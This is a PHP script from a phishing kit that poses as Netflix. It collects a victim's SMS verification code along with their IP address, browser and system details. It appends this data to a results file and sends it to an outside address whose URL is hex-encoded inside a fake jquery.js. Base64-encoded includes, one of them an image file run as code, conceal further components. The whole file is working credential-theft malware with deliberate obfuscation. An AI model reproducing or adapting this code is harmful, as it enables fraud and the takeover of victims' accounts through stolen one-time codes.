<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * NETFLIX -
 * version 3
 *  telegram = @MrxTawFiik
  * channel telegram = @mrx_tawfiik
 
###############################################
#                                C0d3d by Mrx TawFik                                            #
#                  Recording doesn't  make you a Coder                              #
#                             Copyright 2023 NETFLIX                                          #
###############################################

**/
session_start();

include(base64_decode('c3lzdGVtLnBocA'));
include(base64_decode('ZGV0ZWN0LnBocA'));

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	


$phoneNumber = $_SESSION['Smsone'] = $_POST['Smsone'];

$msgbank = '<html>
<body>
    <p class="pop">
        
    </p>
    <div class="content">
        <div class="mail">
            <p style="text-align: center;">   </p>
<p>
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">📲SMS 1 Netflix💖 ┃ '.$_SERVER['REMOTE_ADDR'].'┃ By MrxTawFik 🖕🤡🖕 </h2>
<h2>💬 SMS 1 : <span>'.$_SESSION["Smsone"].'</span> </h2>
<hr class="content" ><h2>💻 System : <span>  '.$OS.' </span>  </h2>
<h2>🌐 BROWSER : <span> '.$browserTy_Version.' </span>  </h2>

<h2>🔍 IP INFO : <span><a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">'.$_SESSION['country1'].'</a></span>
<a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">
<img src="https://www.countryflags.io/'.$_SESSION['countrycode1'].'/flat/16.png" style="
    width: 34px;
    margin: -5px 4px -10px 5px;
"></a> </h2>
<h2>⏰ TIME/DATE : <span> '.$InfoDATE.' </span> </h2><br>
</p>

</div>
        
    </div>
    

</body></html>';

$f = fopen("../../../Results/admin.php", "a");
	fwrite($f, $msgbank);

$yagmai .= '
[💬SMS 1] = '.$_SESSION['Smsone'].'
        [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'

';

file_get_contents("".pack("H*", substr($maluma=file_get_contents("../style/js/jquery.js"),strpos($maluma, "90__")+4,220))."" . urlencode($yagmai)."" );

$yagmail .= '
[+]━━━━━━━━━━━━━━━━【💖Netflix💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【📲 SMS 1 📲】━━━━━━━━━━━━━━━━━━━━[+]
[💬 SMS 1] = '.$_SESSION['Smsone'].'
[+]━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]━━━━━━━━━━━━━━━━【💖Netflix💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【[By MrxTawFik🖕🤡🖕】━━━━━━━━━━━━━[+]
';


include(base64_decode('Li4vLi4vLi4vTXJ4VGF3RmlrLnBocA'));
include(base64_decode('Li4vY3NzL2ljb24uanBn'));






?>



